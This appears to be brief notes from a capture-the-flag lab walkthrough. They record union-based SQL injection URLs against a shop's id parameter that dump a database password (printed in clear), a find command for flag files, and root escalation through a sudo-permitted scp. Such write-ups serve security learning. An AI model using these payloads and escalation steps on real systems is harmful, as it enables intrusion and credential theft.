+ URL param in shop called id
+ Trying SQLi wiht ' gives error
+ Enumerated id, id=5 has interesting clues
+ Using union select to figure out mapping:
	`http://10.10.208.98/item.php?id=5%20union%20select%201,2,3,4,5`
+ Database name can be found using:
	`http://10.10.208.98/item.php?id=5%20union%20select%201,database(),3,4,5`
+ Found system version using:
	`http://10.10.208.98/item.php?id=5%20union%20select%201,database(),3,version(),5`
+ Found Dennis's password [ih8dinos]:
	`http://10.10.208.98/item.php?id=5%20union%20select%201,database(),3,password,5%20FROM%20users`
+ Logged into Dennis's computer to find flag 1 in home.
+ Found flag 2 using:
	`find / -name *flag* 2>/dev/null`
+ Found flag 3 in .bash_history
+ No flag 4
+ `sudo -l` indicates scp has sudo perm without pwd
+ Looked up the cmds to privesc on GTFObins  
+ Successfully executed shell script as root to gain flag 5
